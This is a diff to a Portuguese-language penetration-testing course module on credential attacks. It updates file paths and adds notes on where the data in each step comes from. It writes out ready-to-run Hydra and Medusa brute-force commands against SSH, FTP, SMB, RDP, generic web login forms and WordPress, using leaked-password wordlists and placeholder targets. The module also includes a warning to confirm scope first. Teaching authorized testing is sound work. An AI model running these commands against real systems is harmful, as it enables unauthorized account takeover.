@@ -4,7 +4,12 @@
 **Objetivo:** Obter CREDENCIAIS VÁLIDAS em serviços e logins web — usando os alvos e usuários organizados na Fase 1 e priorizados na Fase 2.
 **Por quê:** Uma senha válida é acesso imediato sem precisar de exploit. É o ataque mais simples e mais eficaz quando há serviços de login expostos.
 
-> ⚠️ **ANTES de rodar qualquer Hydra:** confirme na `09-vetores/escopo.md` que brute force é permitido neste alvo. Labs = sim; produção real = NÃO.
+> ⚠️ **ANTES de rodar qualquer Hydra:** confirme na `16-vetores/escopo.md` que brute force é permitido neste alvo. Labs = sim; produção real = NÃO.
+
+> **📡 Dados usados nos passos abaixo (de onde vêm):**
+> - **Hydra SSH/FTP/SMB/RDP:** `15-alimentacao/usernames-todos.txt` ← MANUAL-RECON `01-intel/theharvester.txt`; `wordlist-bruteforce.txt` ← CeWL + SecLists; alvos/portas ← MANUAL-RECON `02-enum/nmap-services.txt` (via `15-alimentacao/alvos-servicos.txt`)
+> - **Hydra HTTP (Passo 3.4):** `15-alimentacao/formularios.txt` ← MANUAL-WEB `09-descoberta/logins-formularios.txt` (Passo 2.9 do Módulo 02) — ele traz URL, campos e mensagem de erro exata
+> - **Credenciais prontas (Passo 3.1):** `15-alimentacao/credenciais-texto.txt` ← MANUAL-RECON `04-discovery/` + MANUAL-WEB `08-alimentacao/secrets-web.txt`
 
 ---
 
@@ -14,7 +19,7 @@
 
 ```bash
 # Ver as credenciais encontradas
-cat 08-alimentacao/credenciais-texto.txt
+cat 15-alimentacao/credenciais-texto.txt
 
 # Testar uma credencial direto no SSH (uma tentativa)
 ssh -o BatchMode=yes -o ConnectTimeout=5 admin@10.0.0.1
@@ -39,11 +44,11 @@ hydra -l admin -p 'EvilCorp2024!' -t 1 -f ssh://10.0.0.1
 
 ```bash
 # Versão segura: usuário único + wordlist pequena + para no 1º hit
-hydra -l admin -P 08-alimentacao/wordlist-bruteforce.txt -t 4 -f -o 10-bruteforce/hydra-ssh.txt ssh://10.0.0.1
+hydra -l admin -P 15-alimentacao/wordlist-bruteforce.txt -t 4 -f -o 17-bruteforce/hydra-ssh.txt ssh://10.0.0.1
 
 # Versão completa: lista de USUÁRIOS do alvo + wordlist
-hydra -L 08-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
-      -t 4 -f -o 10-bruteforce/hydra-ssh.txt ssh://10.0.0.1
+hydra -L 15-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
+      -t 4 -f -o 17-bruteforce/hydra-ssh.txt ssh://10.0.0.1
 
 # Flags explicadas:
 # -l admin  = usuário único      | -L arquivo = lista de usuários
@@ -65,7 +70,7 @@ hydra -L 08-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Lea
 0 of 1 target completed, 0 valid passwords found
 ```
 
-**O que procurar:** Linhas com `login:` e `password:` = credenciais VÁLIDAS. Salve tudo em `10-bruteforce/`.
+**O que procurar:** Linhas com `login:` e `password:` = credenciais VÁLIDAS. Salve tudo em `17-bruteforce/`.
 
 **❌ Se der errado:**
 | Problema | Causa | Alternativa |
@@ -84,9 +89,9 @@ hydra -L 08-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Lea
 **O que você vai fazer:** Mesmo princípio do SSH, no FTP. FTP normalmente **não tem lockout** por padrão — mas respeite o escopo.
 
 ```bash
-hydra -L 08-alimentacao/usernames-todos.txt \
+hydra -L 15-alimentacao/usernames-todos.txt \
       -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
-      -t 4 -f -o 10-bruteforce/hydra-ftp.txt ftp://10.0.0.1
+      -t 4 -f -o 17-bruteforce/hydra-ftp.txt ftp://10.0.0.1
 ```
 
 **✅ Output esperado:**
@@ -110,24 +115,25 @@ hydra -L 08-alimentacao/usernames-todos.txt \
 
 ### Passo 3.4 — Brute force HTTP POST form (Hydra)
 
-**O que você vai fazer:** Atacar os formulários de login que você mapeou no **Módulo 02** — este é o ponto exato onde os dois módulos se conectam.
+**O que você vai fazer:** Atacar os formulários de login que você mapeou no **Módulo 02 (MANUAL-WEB)** — este é o ponto exato onde os dois módulos se conectam. Os campos vêm de `15-alimentacao/formularios.txt` (importado no Passo 1.4 de `09-descoberta/logins-formularios.txt`).
 
 ```bash
 # Formato do http-post-form do Hydra:
 # /caminho:campos_com_^USER^_e_^PASS^:string_de_falha
 
-# 1) Login genérico (campos username/password — do arquivo formularios.txt)
-hydra -L 08-alimentacao/usernames-todos.txt \
-      -P 08-alimentacao/wordlist-bruteforce.txt \
+# 1) Login genérico (campos username/password — do arquivo formularios.txt,
+#    que veio de 09-descoberta/logins-formularios.txt no MANUAL-WEB)
+hydra -L 15-alimentacao/usernames-todos.txt \
+      -P 15-alimentacao/wordlist-bruteforce.txt \
       -t 1 -W 3 -f \
-      -o 10-bruteforce/hydra-http-login.txt \
+      -o 17-bruteforce/hydra-http-login.txt \
       evilcorp.com http-post-form \
       "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
 
 # 2) WordPress (campos log/pwd — padrão do wp-login.php)
-hydra -l admin -P 08-alimentacao/wordlist-bruteforce.txt \
+hydra -l admin -P 15-alimentacao/wordlist-bruteforce.txt \
       -t 1 -W 3 -f \
-      -o 10-bruteforce/hydra-wp.txt \
+      -o 17-bruteforce/hydra-wp.txt \
       evilcorp.com http-post-form \
       "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=/wp-admin/:F=ERROR"
 
@@ -139,7 +145,7 @@ hydra -l admin -P 08-alimentacao/wordlist-bruteforce.txt \
 # S=    = alternativa: string que aparece quando está CERTA
 ```
 
-**Como descobrir a string `F=` (do Módulo 02):**
+**Como descobrir a string `F=` (do Módulo 02):** se o form veio de `15-alimentacao/formularios.txt`, a mensagem de erro já está na 4ª coluna do arquivo (ex.: `Invalid credentials`). Só descubra manualmente se o arquivo estiver vazio:
 ```bash
 # No navegador: tente logar com senha ERRADA e copie a mensagem exata
 # Ou via curl:
@@ -175,11 +181,11 @@ curl -s -X POST http://evilcorp.com/login -d "username=test&password=wrong"
 ```bash
 # SMB (Windows) — teste primeiro usuário "administrator"
 hydra -l administrator -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
-      -t 4 -f -o 10-bruteforce/hydra-smb.txt smb://10.0.0.1
+      -t 4 -f -o 17-bruteforce/hydra-smb.txt smb://10.0.0.1
 
 # RDP
-hydra -L 08-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
-      -t 4 -f -o 10-bruteforce/hydra-rdp.txt rdp://10.0.0.1
+hydra -L 15-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
+      -t 4 -f -o 17-bruteforce/hydra-rdp.txt rdp://10.0.0.1
 
 # Enumerar usuários SMB antes (melhora MUITO a taxa de acerto)
 # (esta etapa é do Módulo 04 — pós-exploração/redes — mas é útil aqui)
@@ -207,7 +213,7 @@ nmap --script smb-enum-users -p 445 10.0.0.1
 ```bash
 # Mesmo ataque SSH com Medusa
 medusa -h 10.0.0.1 -u admin -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
-       -M ssh -T 4 -O 10-bruteforce/medusa-ssh.log
+       -M ssh -T 4 -O 17-bruteforce/medusa-ssh.log
 
 # Flags:
 # -h host  | -u usuário | -P wordlist
@@ -247,7 +253,7 @@ curl -s -X POST http://evilcorp.com/login \
 # Se retornou sessão/cookie/302 para /admin → válido ✅
 
 # 4) Documentar IMEDIATAMENTE
-cat > 10-bruteforce/credenciais-encontradas.md << 'EOF'
+cat > 17-bruteforce/credenciais-encontradas.md << 'EOF'
 # Credenciais Encontradas — evilcorp.com
 
 | # | Serviço | Host | Usuário | Senha | Valida? | Evidência |
@@ -278,17 +284,17 @@ EOF
 
 | # | Item | Arquivo gerado | ☑ |
 |---|------|---------------|:---:|
-| 1 | Credenciais em texto testadas primeiro | `08-alimentacao/credenciais-texto.txt` | [ ] |
-| 2 | SSH brute force | `10-bruteforce/hydra-ssh.txt` | [ ] |
-| 3 | FTP brute force (se porta 21 aberta) | `10-bruteforce/hydra-ftp.txt` | [ ] |
-| 4 | HTTP form brute force (se tem login web) | `10-bruteforce/hydra-http-login.txt` | [ ] |
-| 5 | SMB/RDP (se 445/3389 abertas) | `10-bruteforce/hydra-smb.txt` | [ ] |
-| 6 | Credenciais VALIDADAS manualmente | `10-bruteforce/credenciais-encontradas.md` | [ ] |
+| 1 | Credenciais em texto testadas primeiro | `15-alimentacao/credenciais-texto.txt` | [ ] |
+| 2 | SSH brute force | `17-bruteforce/hydra-ssh.txt` | [ ] |
+| 3 | FTP brute force (se porta 21 aberta) | `17-bruteforce/hydra-ftp.txt` | [ ] |
+| 4 | HTTP form brute force (se tem login web) | `17-bruteforce/hydra-http-login.txt` | [ ] |
+| 5 | SMB/RDP (se 445/3389 abertas) | `17-bruteforce/hydra-smb.txt` | [ ] |
+| 6 | Credenciais VALIDADAS manualmente | `17-bruteforce/credenciais-encontradas.md` | [ ] |
 
 ### 📁 Sua pasta deve estar assim ao final da Fase 3:
 
 ```
-10-bruteforce/
+17-bruteforce/
 ├── hydra-ssh.txt             ← resultados do Hydra no SSH
 ├── hydra-ftp.txt             ← resultados no FTP
 ├── hydra-http-login.txt      ← resultados no login web (Módulo 02)
